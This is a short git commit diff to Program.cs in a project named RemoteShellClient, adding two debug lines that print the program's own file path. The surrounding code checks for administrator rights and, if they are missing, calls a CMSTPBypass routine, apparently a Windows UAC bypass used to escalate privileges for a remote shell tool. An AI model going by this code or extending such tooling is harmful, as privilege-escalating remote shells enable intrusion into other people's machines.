c9fde712113dabb60ab9b4dbdb5d6aa10fa4c2e0
Aleksej Gladkov <utiha@sasuke.ru>
2024-01-21 16:28:54 +0500

    1

--- RemoteShellClient/Program.cs
+++ RemoteShellClient/Program.cs
@@ -2,10 +2,13 @@
 using System.Security.Principal;
 using RemoteShellClient;
 
+Console.WriteLine(Assembly.GetExecutingAssembly().Location);
+
 var identity  = WindowsIdentity.GetCurrent();
 var principal = new WindowsPrincipal(identity);
 if (!principal.IsInRole(WindowsBuiltInRole.Administrator))
 {
+    Console.WriteLine(Assembly.GetExecutingAssembly().Location);
     CMSTPBypass.Execute(Assembly.GetExecutingAssembly().Location);
     Environment.Exit(1);
 }
